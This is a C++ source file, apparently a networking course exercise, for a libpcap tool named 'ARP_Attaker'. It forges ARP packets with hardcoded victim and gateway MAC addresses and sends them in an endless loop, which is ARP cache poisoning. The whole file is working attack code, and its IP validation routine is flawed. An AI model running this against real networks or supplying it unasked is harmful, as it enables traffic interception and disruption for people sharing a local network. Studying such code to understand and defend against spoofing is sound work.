#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <unistd.h>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

class ARP_Attaker{
	private :
		EthArpPacket packet;
		pcap_t* handle;

	public :
		void activate();
        ARP_Attaker(char* interface, char *sender_ip, char *target_ip);
};

ARP_Attaker::ARP_Attaker(char* interface, char* sender_ip, char* target_ip) {

	char* dev = interface;
	char errbuf[PCAP_ERRBUF_SIZE];
	handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}

	// gatway
	packet.eth_.dmac_ = Mac("f2:88:7b:8c:a0:26");
	packet.eth_.smac_ = Mac("00:0f:00:c0:2b:09");
	packet.eth_.type_ = htons(EthHdr::Arp); 
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request); // Victim : 192.168.35.11 00:0f:00:c0:2b:09
	packet.arp_.smac_ = Mac("00:0f:00:c0:2b:09"); 
	packet.arp_.sip_ = htonl(Ip(sender_ip)); 
	packet.arp_.tmac_ = Mac("f2-88-7b-8c-a0-26");
	packet.arp_.tip_ = htonl(Ip(target_ip)); // 192.168.35.211, 94:E2:3C:D6:CF:D1
}

void ARP_Attaker::activate(){

	while(true){
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}
	

	pcap_close(handle);
}


int is_valid_ip(char* ip){
	int dot_cnt = 0;
	int char_cnt = -1;
	

	for(int i = 0; i < 16; i++ ){
		char_cnt++;
		if(ip[i] == '.' && char_cnt <= 3){
			char_cnt = -1;
			dot_cnt++;
			if(ip[i] == '\0') break;
		}
		
	}
	if(dot_cnt == 3)
		return true;
	else 
		return false;
}

int main(int argc, char* argv[]) {
	if (argc != 4) {
		usage();
		return -1;
	}
	
	if(!is_valid_ip( argv[2]) || !is_valid_ip( argv[3] )){
		printf("validation_ip \n");
		usage();
		return -1;
	}
		
	
	ARP_Attaker attacker(argv[1], argv[2], argv[3]);
	attacker.activate();

	return 1;
}
